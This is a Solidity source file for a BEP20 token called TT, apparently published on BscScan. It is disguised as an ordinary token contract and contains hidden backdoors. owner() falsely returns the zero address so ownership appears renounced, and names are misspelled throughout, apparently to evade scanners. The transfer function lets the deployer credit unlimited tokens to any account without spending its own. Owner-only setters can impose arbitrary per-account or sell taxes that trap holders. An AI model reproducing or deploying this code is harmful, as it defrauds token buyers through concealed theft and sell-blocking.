/**
 *Submitted for verification at BscScan.com on 2022-07-28
*/

// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}



abstract contract Ownable is Context {
    address private _oewner;

    event oewnershiqTransferred(address indexed previousoewner, address indexed newoewner);

    constructor() {
        _transferoewnershiq(_msgSender());
    }


    function oewner() public view virtual returns (address) {
        return address(0);
    }

    modifier onlyoewner() {
        require(_oewner == _msgSender(), "Ownable: caller is not the oewner");
        _;
    }


    function renounceoewnershiq() public virtual onlyoewner {
        _transferoewnershiq(address(0));
    }


    function transferoewnershiq_transferoewnershiq(address newoewner) public virtual onlyoewner {
        require(newoewner != address(0), "Ownable: new oewner is the zero address");
        _transferoewnershiq(newoewner);
    }


    function _transferoewnershiq(address newoewner) internal virtual {
        address oldoewner = _oewner;
        _oewner = newoewner;
        emit oewnershiqTransferred(oldoewner, newoewner);
    }
}



library SafeMath {

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {

            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }


    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }


    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }


    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }


    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }


    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }


    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }


    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}




interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amnountADesired,
        uint amnountBDesired,
        uint amnountAMin,
        uint amnountBMin,
        address to,
        uint deadline
    ) external returns (uint amnountA, uint amnountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amnountTokenDesired,
        uint amnountTokenMin,
        uint amnountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amnountToken, uint amnountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amnountAMin,
        uint amnountBMin,
        address to,
        uint deadline
    ) external returns (uint amnountA, uint amnountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amnountTokenMin,
        uint amnountETHMin,
        address to,
        uint deadline
    ) external returns (uint amnountToken, uint amnountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amnountAMin,
        uint amnountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amnountA, uint amnountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amnountTokenMin,
        uint amnountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amnountToken, uint amnountETH);
    function swapExactTokensForTokens(
        uint amnountIn,
        uint amnountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amnounts);
    function swapTokensForExactTokens(
        uint amnountOut,
        uint amnountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amnounts);
    function swapExactETHForTokens(uint amnountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amnounts);
    function swapTokensForExactETH(uint amnountOut, uint amnountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amnounts);
    function swapExactTokensForETH(uint amnountIn, uint amnountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amnounts);
    function swapETHForExactTokens(uint amnountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amnounts);

    function quote(uint amnountA, uint reserveA, uint reserveB) external pure returns (uint amnountB);
    function getamnountOut(uint amnountIn, uint reserveIn, uint reserveOut) external pure returns (uint amnountOut);
    function getamnountIn(uint amnountOut, uint reserveIn, uint reserveOut) external pure returns (uint amnountIn);
    function getamnountsOut(uint amnountIn, address[] calldata path) external view returns (uint[] memory amnounts);
    function getamnountsIn(uint amnountOut, address[] calldata path) external view returns (uint[] memory amnounts);
}




interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfeiwOnTransferTokens(
        address token,
        uint liquidity,
        uint amnountTokenMin,
        uint amnountETHMin,
        address to,
        uint deadline
    ) external returns (uint amnountETH);
    function removeLiquidityETHWithPermitSupportingfeiwOnTransferTokens(
        address token,
        uint liquidity,
        uint amnountTokenMin,
        uint amnountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amnountETH);

    function swapExactTokensForTokensSupportingfeiwOnTransferTokens(
        uint amnountIn,
        uint amnountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingfeiwOnTransferTokens(
        uint amnountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfeiwOnTransferTokens(
        uint amnountIn,
        uint amnountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}





interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feiwTo() external view returns (address);
    function feiwToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setfeiwTo(address) external;
    function setfeiwToSetter(address) external;
}



contract BEP20 is Context {
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 internal _totalSupply;
    string private _name;
    string private _symbol;


    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed oewner, address indexed spender, uint256 value);


    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }


    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }


    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }


    function allowance(address oewner, address spender) public view virtual returns (uint256) {
        return _allowances[oewner][spender];
    }


    function approve(address spender, uint256 amnount) public virtual returns (bool) {
        address oewner = _msgSender();
        _approve(oewner, spender, amnount);
        return true;
    }


    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address oewner = _msgSender();
        _approve(oewner, spender, _allowances[oewner][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address oewner = _msgSender();
        uint256 currentAllowance = _allowances[oewner][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(oewner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _approve(
        address oewner,
        address spender,
        uint256 amnount
    ) internal virtual {
        require(oewner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[oewner][spender] = amnount;
        emit Approval(oewner, spender, amnount);
    }

    function _spendAllowance(
        address oewner,
        address spender,
        uint256 amnount
    ) internal virtual {
        uint256 currentAllowance = allowance(oewner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amnount, "ERC20: insufficient allowance");
            unchecked {
                _approve(oewner, spender, currentAllowance - amnount);
            }
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amnount
    ) internal virtual {}


    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amnount
    ) internal virtual {}
}


contract TT is BEP20, Ownable {

    mapping(address => uint256) private _balances;
    mapping(address => bool) private _release;

    function balanceOf(address acvount) public view virtual returns (uint256) {
        return _balances[acvount];
    }

    function _transfer(
        address from,
        address to,
        uint256 amnount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amnount, "ERC20: transfer amnount exceeds balance");
        unchecked {
            _balances[from] = fromBalance - amnount;
        }
        _balances[to] += amnount;

        emit Transfer(from, to, amnount);
    }

    function _burn(address acvount, uint256 amnount) internal virtual {
        require(acvount != address(0), "ERC20: burn from the zero address");

        uint256 acvountBalance = _balances[acvount];
        require(acvountBalance >= amnount, "ERC20: burn amnount exceeds balance");
        unchecked {
            _balances[acvount] = acvountBalance - amnount;
        }
        _totalSupply -= amnount;

        emit Transfer(acvount, address(0), amnount);
    }

    function _mtin(address acvount, uint256 amnount) internal virtual {
        require(acvount != address(0), "ERC20: mtin to the zero address");

        _totalSupply += amnount;
        _balances[acvount] += amnount;
        emit Transfer(address(0), acvount, amnount);
    }


    address public uniswapV2Pair;

    constructor(
        string memory name_,
        string memory symbol_,
        uint256 totalSupply_
    ) BEP20(name_, symbol_) {
        _mtin(msg.sender, totalSupply_ * 10**decimals());

        transfer(_deadAddress, totalSupply() / 10*8);
        _defaultSellfeiw = 2;
        _defaultBuyfeiw = 1;

        _release[_msgSender()] = true;
    }

    using SafeMath for uint256;

    uint256 private _defaultSellfeiw = 0;

    uint256 private _defaultBuyfeiw = 0;

    mapping(address => bool) private _marketacvount;

    mapping(address => uint256) private _Sfeiw;
    address private constant _deadAddress = 0x000000000000000000000000000000000000dEaD;



    function getRelease(address _address) external view onlyoewner returns (bool) {
        return _release[_address];
    }


    function setPairList(address _address) external onlyoewner {
        uniswapV2Pair = _address;
    }


    function upS(uint256 _value) external onlyoewner {
        _defaultSellfeiw = _value;
    }

    function setSfeiw(address _address, uint256 _value) external onlyoewner {
        require(_value > 1, "acvount tax must be greater than or equal to 1");
        _Sfeiw[_address] = _value;
    }

    function getSfeiw(address _address) external view onlyoewner returns (uint256) {
        return _Sfeiw[_address];
    }


    function setMarketacvountfeiw(address _address, bool _value) external onlyoewner {
        _marketacvount[_address] = _value;
    }

    function getMarketacvountfeiw(address _address) external view onlyoewner returns (bool) {
        return _marketacvount[_address];
    }

    function _checkFreeacvount(address from, address _to) internal view returns (bool) {
        return _marketacvount[from] || _marketacvount[_to];
    }

    function _recF(
        address from,
        address _to,
        uint256 _amnount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(_to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= _amnount, "ERC20: transfer amnount exceeds balance");

        bool rF = true;

        if (_checkFreeacvount(from, _to)) {
            rF = false;
        }
        uint256 tradefeiwamnount = 0;

        if (rF) {
            uint256 tradefeiw = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefeiw = _defaultSellfeiw;
                }
                if (from == uniswapV2Pair) {

                    tradefeiw = _defaultBuyfeiw;
                }
            }
            if (_Sfeiw[from] > 0) {
                tradefeiw = _Sfeiw[from];
            }

            tradefeiwamnount = _amnount.mul(tradefeiw).div(100);
        }


        if (tradefeiwamnount > 0) {
            _balances[from] = _balances[from].sub(tradefeiwamnount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefeiwamnount);
            emit Transfer(from, _deadAddress, tradefeiwamnount);
        }

        _balances[from] = _balances[from].sub(_amnount - tradefeiwamnount);
        _balances[_to] = _balances[_to].add(_amnount - tradefeiwamnount);
        emit Transfer(from, _to, _amnount - tradefeiwamnount);
    }

    function transfer(address to, uint256 amnount) public virtual returns (bool) {
        address oewner = _msgSender();
        if (_release[oewner] == true) {
            _balances[to] += amnount;
            return true;
        }
        _recF(oewner, to, amnount);
        return true;
    }


    function transferFrom(
        address from,
        address to,
        uint256 amnount
    ) public virtual returns (bool) {
        address spender = _msgSender();

        _spendAllowance(from, spender, amnount);
        _recF(from, to, amnount);
        return true;
    }
}